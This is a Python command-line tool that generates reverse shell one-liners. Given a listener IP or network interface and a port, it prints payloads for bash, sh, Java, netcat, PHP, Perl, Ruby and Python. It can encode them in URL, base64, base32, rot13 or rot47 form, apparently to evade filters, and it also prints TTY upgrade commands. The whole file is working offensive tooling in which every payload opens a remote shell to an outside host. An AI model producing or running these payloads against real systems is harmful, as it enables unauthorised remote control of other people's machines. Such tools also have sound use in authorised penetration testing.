#!/usr/bin/python3

import re
import os
import sys
import codecs
import base64
import argparse
import netifaces

from urllib.parse import *

class Oneliner:
	def __init__(self):
		try:
			self.args()
			self.rev_shell()
		except Exception as e:
			error(e)

	def args(self):
		parser = argparse.ArgumentParser(description="Stand-Alone oneliner reverse shell payload creator.", usage="./%(prog)s [NIC] -s [SHELL TYPE]", add_help=False)
		parser._positionals.title = "Positional arguments"
		parser._optionals.title = "Flags"
		parser.add_argument("-h", "--help", action="help", help="Shows this help message and exits.", default=argparse.SUPPRESS)
		parser.add_argument('-v', "--version", action="version", version="version: %(prog)s 2.0", help="Shows the version and exits.")
		parser.add_argument(dest="lhost", help="Your local machine IP address.", metavar="LHOST")
		if "tty" in sys.argv[1]:
			self.args = parser.parse_args()
			if self.args.lhost == "tty" or self.args.lhost == "tty2":
				print('''export TERM=xterm;python -c "import pty;pty.spawn('/bin/bash')"''')
				sys.exit()

			elif self.args.lhost == "tty3":
				print('''export TERM=xterm;python3 -c "import pty;pty.spawn('/bin/bash')"''')
				sys.exit()

		parser.add_argument('-p',"--port", help="Your listening port.", dest="port", metavar="", default=4444, type=int)
		parser.add_argument("-s", "--shell", help="Reverse Shell type. Example - netcat.", dest="shell", metavar="", choices=['sh', 'bash', 'java', 'python3', 'python', 'ruby', 'rb', 'perl', 'pl', 'netcat', 'nc', 'php'], required=True)
		parser.add_argument("-e", '--encode', help="Encodes the payload. Example - url.", dest="encode", metavar="", choices=['url', 'b64', 'b32', 'rot13', 'rot47'])
		self.args = parser.parse_args()

		if self.args.port > 65535 or self.args.port == 0:
			error("Wrong port specified.")

		_ = os.listdir("/sys/class/net/")

		for i in _:
			if i == self.args.lhost:
				p = True
				break

			else:
				p = False

		if p or "." not in self.args.lhost:
			try:
				self.args.lhost = netifaces.ifaddresses(self.args.lhost)[netifaces.AF_INET][0]['addr']

			except:
				error("Interface not availiable.")

		else:
			ip = re.compile("^((25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9]?[0-9])\.){3}(25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9]?[0-9])$")
			if not ip.search(self.args.lhost):
				error("Wrong IP address specified.")

		if "python" in self.args.shell:
			self.shell = self.args.shell

		elif self.args.shell == "ruby" or self.args.shell == "rb":
			self.shell = "ruby"

		elif self.args.shell == "perl" or self.args.shell == "pl":
			self.shell = "perl"

		elif self.args.shell == "netcat" or self.args.shell == "nc":
			self.shell = "nc"

		else:
			self.shell = self.args.shell

	def rev_shell(self):
		if self.shell == "bash":
			payload = f"bash -i >& /dev/tcp/{self.args.lhost}/{self.args.port} 0>&1"

		if self.shell == "sh":
			payload = f"sh -i >& /dev/tcp/{self.args.lhost}/{self.args.port} 0>&1"

		if self.shell == "java":
			payload = f"""r = Runtime.getRuntime();p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/{self.args.lhost}/{self.args.port};cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[]);p.waitFor()"""

		if self.shell == "nc":
			payload = f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {self.args.lhost} {self.args.port} >/tmp/f"

		if self.shell == "php":
			payload = f"""php -r '$sock=fsockopen({self.args.lhost},{self.args.port});exec("/bin/sh -i <&3 >&3 2>&3");'"""

		if self.shell == "perl":
			perl_obj = '''{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'''
			payload = f"""perl -e 'use Socket;$i={self.args.lhost};$p={self.args.port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){perl_obj};'"""

		if self.shell == "ruby":
			payload = f"""ruby -rsocket -e'f=TCPSocket.open({self.args.lhost},{self.args.port}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'"""

		if self.shell == "python":
			payload = f"""python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{self.args.lhost}",{self.args.port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'"""

		if self.shell == "python3":
			payload = f"""python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{self.args.lhost}",{self.args.port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'"""

		if self.args.encode:
			self.payload = payload
			self.encode()

		else:
			print(payload)
			sys.exit()

	def encode(self):
		e = self.args.encode
		if e == "url":
			print(quote_plus(self.payload))

		elif e == "b64":
			print(base64.b64encode(self.payload.encode()).decode())

		elif e == "b32":
			print(base64.b32encode(self.payload.encode()).decode())

		elif e == "rot13":
			print(codecs.encode(self.payload, "rot_13"))

		elif e == "rot47":
			key = 47
			text = ""
			for i in range(len(self.payload)):
				tmp = ord(self.payload[i]) + key
				if ord(self.payload[i]) == 32:
					text += ' '
				elif tmp > 126:
					tmp -= 94
					text += chr(tmp)
				else:
					text += chr(tmp)

			print(text)

def error(s):
	sys.stderr.write(f"[!] Exception: {s}\n")
	sys.exit()

if __name__ == '__main__':
	Oneliner()
